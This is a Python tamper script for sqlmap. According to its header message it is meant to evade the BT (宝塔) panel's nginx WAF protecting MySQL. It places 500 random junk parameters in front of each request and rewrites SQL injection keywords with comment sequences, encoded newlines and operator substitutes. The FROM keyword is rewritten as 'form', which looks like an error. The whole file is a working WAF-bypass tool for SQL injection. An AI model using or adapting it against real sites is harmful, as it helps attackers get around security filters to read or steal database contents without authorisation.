import os,re,random,string
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.compat import xrange
from lib.core.enums import HINT
from lib.core.settings import DEFAULT_GET_POST_DELIMITER

priority = PRIORITY.HIGHEST

def dependencies():
        singleTimeWarnMessage("宝塔nginx(Mysql) tamper脚本(%s)--Author:lemonlove7 '%s'" % (DBMS.MYSQL,os.path.basename(__file__).split(".")[0]))

def tamper(payload, **kwargs): #kwargs是修改http头里的内容函数
        hints = kwargs.get("hints", {})
        delimiter = kwargs.get("delimiter", DEFAULT_GET_POST_DELIMITER)
        hints[HINT.PREPEND] = delimiter.join("%s=" % "".join(random.sample(string.ascii_letters + string.digits, 2)) for _ in xrange(500))
        payload=payload.replace(' AND ',' %26%26 ')
        payload=payload.replace('SELECT',' select-- -%0a')
        payload = payload.replace('SLEEP(', 'sleep--%0a(')
        payload = payload.replace(' OR ', ' || ')
        payload = payload.replace('EXTRACTVALUE(', 'EXTRACTVALUE-- -%0a(')
        payload = payload.replace('FROM', ' form-- -%0a ')
        return payload